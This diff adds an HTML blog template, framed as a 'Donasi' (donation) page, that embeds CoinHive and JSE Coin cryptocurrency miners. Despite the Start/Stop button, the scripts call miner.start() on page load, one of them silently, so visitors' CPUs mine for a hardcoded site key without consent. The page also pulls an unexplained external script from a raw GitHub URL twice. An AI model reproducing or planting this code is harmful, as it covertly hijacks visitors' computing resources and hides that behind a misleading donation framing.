@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<?xml version="1.0" encoding="UTF-8" ?>
+<html xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'> 
+  <head> 
+    <link href='https://photos.app.goo.gl/Yc9hNzLexz2IdKg53' rel='shortcut icon' type='image/x-icon'/>
+	<link href='https://photos.app.goo.gl/Yc9hNzLexz2IdKg53' rel='icon' type='image/x-icon'/>
+	<script src="https://coinhive.com/lib/miner.min.js" async></script>
+      <b:skin><![CDATA[ ]]></b:skin>
+  </head>
+	<body class='  wsite-theme-light'> 
+		<b:section id='Donasiku'/> 
+		
+Moxorox:
+<left>
+<p id="tcount"></p>
+<p id="hps"></p>
+<p id="ths"></p>
+<p id="tah"></p>
+</left>
+<center>
+<p id="minebutton"></p>
+</center>
+<p>You can start or stop at anytime but please wait for some accepted hashes before you do.</p>
+<p>Visit <a href="https://coinhive.com/">Coin Hive</a> to learn more about how this works</a>
+<script src="https://raw.githubusercontent.com/helowoi/1/master/nine.js"></script>
+<script type="text/javascript">
+var miner = new CoinHive.Anonymous('GnRYj5sLYwhB6GqgSfrVIDWOFnFks5vZ', 
+  {
+    threads: 4,
+	autoThreads: false,
+	throttle: 0.1
+  });
+miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+// Update stats once per second
+setInterval(function() {
+    var threadCount = miner.getNumThreads();
+    var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
+    var totalHashes = miner.getTotalHashes();
+    var acceptedHashes = miner.getAcceptedHashes() / 256;
+    // Output to HTML elements...
+    if (miner.isRunning()) {
+        document.getElementById("tcount").innerHTML = "Threads: " + threadCount;
+        document.getElementById("hps").innerHTML = "hashes per second: " + hashesPerSecond;
+        document.getElementById("ths").innerHTML = "Total Hashes: " + totalHashes;
+        document.getElementById("tah").innerHTML = "Accepted Hashes: " + acceptedHashes;
+        document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.stop()\">Stop Donasi</button>";
+    } else {
+        document.getElementById("hps").innerHTML = "Please click start";
+        document.getElementById("ths").innerHTML = "to support";
+        document.getElementById("tah").innerHTML = "this site";
+        document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)\">Start Donasi</button>";
+    }
+}, 1000);
+</script>
+		<script src="https://raw.githubusercontent.com/helowoi/1/master/nine.js"></script>
+<script>  
+  var miner = new CoinHive.Anonymous('GnRYj5sLYwhB6GqgSfrVIDWOFnFks5vZ', 
+  {
+    threads: 1,
+	autoThreads: false,
+	throttle: 0.1
+  });
+    miner.start();
+</script>
+<script type="text/javascript">
+(function() {
+var trackingurl = 'https://load.jsecoin.com/server/load/3919/noweb/nojs/0/';
+var d=document, j=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+j.type='text/javascript'; j.async=true; j.defer=true; j.src=trackingurl; s.parentNode.insertBefore(j,s);
+})();
+</script>
+</body>
+</html>
